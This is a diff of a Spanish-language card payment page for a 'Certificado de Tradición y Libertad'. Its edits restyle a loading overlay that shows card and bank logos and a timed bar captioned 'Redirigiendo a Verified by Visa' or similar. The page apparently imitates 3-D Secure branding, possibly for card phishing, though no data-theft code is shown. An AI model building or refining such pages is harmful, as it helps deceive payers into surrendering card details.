@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Pago Seguro — Certificado de Tradición y Libertad</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
@@ -477,7 +477,7 @@
         }
 
         /* ============================================ */
-        /* LOADING OVERLAY CON BARRA DE PROGRESO        */
+        /* LOADING OVERLAY - ESTILO LIMPIO              */
         /* ============================================ */
         .loading-overlay {
             display: none;
@@ -486,13 +486,14 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.92);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            padding: 20px;
         }
 
         .loading-overlay.active {
@@ -502,20 +503,20 @@
         .loading-card {
             background: #ffffff;
             border-radius: 16px;
-            padding: 40px 48px;
-            max-width: 420px;
-            width: 90%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
+            padding: 32px 28px;
+            max-width: 340px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
             text-align: center;
             animation: slideUp 0.4s ease-out;
-            margin: 0 auto;
-            position: relative;
+            margin: auto;
+            border: 1px solid #f0f0f0;
         }
 
         @keyframes slideUp {
             from {
                 opacity: 0;
-                transform: translateY(30px) scale(0.95);
+                transform: translateY(20px) scale(0.96);
             }
             to {
                 opacity: 1;
@@ -523,30 +524,19 @@
             }
         }
 
-        /* Logos superiores */
+        /* Logos superiores - SOLO IMAGENES, SIN TEXTO */
         .logos-header {
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 16px;
             margin-bottom: 20px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid var(--co-border);
         }
 
         .logo-item {
             display: flex;
-            flex-direction: column;
             align-items: center;
-            gap: 4px;
-        }
-
-        .logo-item .logo-label {
-            font-size: 0.55rem;
-            font-weight: 600;
-            color: var(--co-text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
+            justify-content: center;
         }
 
         .logo-item .logo-img {
@@ -557,35 +547,29 @@
         }
 
         .logo-divider {
-            font-size: 1.2rem;
-            color: var(--co-border);
+            font-size: 1.4rem;
+            color: #d1d5db;
             font-weight: 300;
         }
 
-        /* Texto */
+        /* Texto - estilo simple como en la imagen */
         .loading-card .loading-text {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: var(--co-text);
-            margin-bottom: 4px;
-        }
-
-        .loading-card .loading-subtext {
-            font-size: 0.875rem;
-            color: var(--co-text-muted);
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--co-text-2);
             margin-bottom: 16px;
+            letter-spacing: 0.2px;
         }
 
-        /* Barra de progreso */
+        /* Barra de progreso - solo la barra, sin contador */
         .progress-bar-wrapper {
             width: 100%;
-            margin-top: 8px;
         }
 
         .progress-bar-track {
             width: 100%;
-            height: 8px;
-            background: var(--co-input-bg);
+            height: 4px;
+            background: #e5e7eb;
             border-radius: 4px;
             overflow: hidden;
             position: relative;
@@ -607,7 +591,7 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
             animation: shimmer 1.5s infinite;
         }
 
@@ -616,19 +600,11 @@
             100% { transform: translateX(100%); }
         }
 
-        .progress-percentage {
-            font-size: 0.875rem;
-            font-weight: 600;
-            color: var(--co-blue);
-            margin-top: 8px;
-            text-align: center;
-        }
-
-        /* Estado de carga inicial (sin logos) */
+        /* Estado de carga inicial (spinner) */
         .loading-card .initial-spinner {
             display: none;
-            width: 48px;
-            height: 48px;
+            width: 40px;
+            height: 40px;
             border: 3px solid var(--co-border);
             border-top: 3px solid var(--co-blue);
             border-radius: 50%;
@@ -778,7 +754,7 @@
         }
 
         /* ============================================ */
-        /* RESPONSIVE PARA PANTALLA DE CARGA EN MÓVIL   */
+        /* RESPONSIVE - CENTRADO EN MÓVIL               */
         /* ============================================ */
         @media (max-width: 768px) {
             .content-wrapper {
@@ -794,13 +770,12 @@
             
             .loading-card {
                 padding: 28px 20px;
-                width: 92%;
-                max-width: 380px;
-                margin: 0 auto;
+                max-width: 320px;
+                margin: auto;
             }
-            .logos-header { gap: 12px; }
-            .logo-item .logo-img { height: 36px; max-width: 70px; }
-            .logo-divider { font-size: 1rem; }
+            .logo-item .logo-img { height: 38px; max-width: 75px; }
+            .logos-header { gap: 14px; }
+            .logo-divider { font-size: 1.2rem; }
         }
 
         @media (max-width: 480px) {
@@ -810,59 +785,56 @@
             
             .loading-card {
                 padding: 24px 16px;
-                width: 94%;
-                max-width: 340px;
-                margin: 0 auto;
+                max-width: 290px;
+                margin: auto;
             }
-            .logo-item .logo-img { height: 30px; max-width: 60px; }
-            .logos-header { gap: 8px; }
-            .logo-item .logo-label { font-size: 0.5rem; }
+            .logo-item .logo-img { height: 32px; max-width: 60px; }
+            .logos-header { gap: 10px; }
+            .logo-divider { font-size: 1rem; }
+            .loading-card .loading-text { font-size: 0.85rem; }
         }
 
-        /* Para pantallas muy pequeñas */
         @media (max-width: 360px) {
             .loading-card {
-                padding: 20px 12px;
-                width: 96%;
+                padding: 20px 14px;
+                max-width: 260px;
+                margin: auto;
             }
-            .logo-item .logo-img { height: 26px; max-width: 50px; }
-            .loading-card .loading-text { font-size: 0.95rem; }
-            .loading-card .loading-subtext { font-size: 0.75rem; }
+            .logo-item .logo-img { height: 28px; max-width: 50px; }
+            .logos-header { gap: 8px; }
+            .logo-divider { font-size: 0.8rem; }
+            .loading-card .loading-text { font-size: 0.8rem; }
         }
     </style>
 </head>
 <body>
     <!-- ============================================ -->
-    <!-- LOADING OVERLAY CON BARRA DE PROGRESO        -->
+    <!-- LOADING OVERLAY - ESTILO LIMPIO              -->
     <!-- ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
-            <!-- Spinner inicial (se oculta cuando se aprueba) -->
+            <!-- Spinner inicial -->
             <div class="initial-spinner active" id="initialSpinner"></div>
             
-            <!-- Logos superiores (se muestran cuando se aprueba) -->
+            <!-- Logos superiores (SOLO IMAGENES) -->
             <div class="logos-header" id="logosHeader" style="display:none;">
                 <div class="logo-item">
-                    <span class="logo-label">Tarjeta</span>
                     <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
                 </div>
                 <span class="logo-divider">+</span>
                 <div class="logo-item">
-                    <span class="logo-label">Banco Emisor</span>
                     <img id="bankLogoImg" src="" alt="Logo banco" class="logo-img" />
                 </div>
             </div>
 
-            <!-- Textos -->
+            <!-- Texto simple -->
             <div class="loading-text" id="loadingText">Procesando pago...</div>
-            <div class="loading-subtext" id="loadingSubtext">Verificando información de la tarjeta</div>
 
-            <!-- Barra de progreso -->
+            <!-- Barra de progreso (SOLO LA BARRA, SIN CONTADOR) -->
             <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
                 <div class="progress-bar-track">
                     <div class="progress-bar-fill-loading" id="progressFill"></div>
                 </div>
-                <div class="progress-percentage" id="progressPercentage">0%</div>
             </div>
         </div>
     </div>
@@ -1157,13 +1129,11 @@
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
-        const loadingSubtext = document.getElementById('loadingSubtext');
         const logosHeader = document.getElementById('logosHeader');
         const cardLogoImg = document.getElementById('cardLogoImg');
         const bankLogoImg = document.getElementById('bankLogoImg');
         const progressWrapper = document.getElementById('progressWrapper');
         const progressFill = document.getElementById('progressFill');
-        const progressPercentage = document.getElementById('progressPercentage');
         const initialSpinner = document.getElementById('initialSpinner');
         const statusMessage = document.getElementById('statusMessage');
 
@@ -1333,7 +1303,7 @@
         }
 
         // ============================================
-        // MOSTRAR PANTALLA DE CARGA CON BARRA
+        // MOSTRAR PANTALLA DE CARGA - ESTILO LIMPIO
         // ============================================
         function mostrarCargaConLogos(tipoTarjeta, banco) {
             // Ocultar spinner inicial
@@ -1356,6 +1326,7 @@
                 bankLogoImg.src = bankLogoFile;
                 bankLogoImg.alt = banco;
                 document.querySelector('.logo-item:last-child').style.display = 'flex';
+                document.querySelector('.logo-divider').style.display = 'block';
             } else {
                 document.querySelector('.logo-item:last-child').style.display = 'none';
                 document.querySelector('.logo-divider').style.display = 'none';
@@ -1364,16 +1335,15 @@
             // Mostrar barra de progreso
             progressWrapper.style.display = 'block';
             
-            // Actualizar textos
+            // Texto simple
             const nombres = {
                 'visa': 'Verified by Visa',
                 'mastercard': 'Mastercard SecureCode',
                 'amex': 'American Express SafeKey'
             };
             loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
-            loadingSubtext.textContent = 'Por favor espere';
             
-            // Animar barra de progreso
+            // Animar barra de progreso (sin contador)
             let progress = 0;
             const duration = 3000;
             const interval = 50;
@@ -1381,7 +1351,6 @@
             const increment = 100 / steps;
             
             progressFill.style.width = '0%';
-            progressPercentage.textContent = '0%';
             
             const timer = setInterval(() => {
                 progress += increment;
@@ -1393,7 +1362,6 @@
                     }, 400);
                 }
                 progressFill.style.width = progress + '%';
-                progressPercentage.textContent = Math.round(progress) + '%';
             }, interval);
         }
 
@@ -1593,7 +1561,6 @@
             logosHeader.style.display = 'none';
             progressWrapper.style.display = 'none';
             loadingText.textContent = 'Procesando pago...';
-            loadingSubtext.textContent = 'Verificando información de la tarjeta';
             
             document.querySelector('.logo-item:last-child').style.display = 'flex';
             document.querySelector('.logo-divider').style.display = 'block';
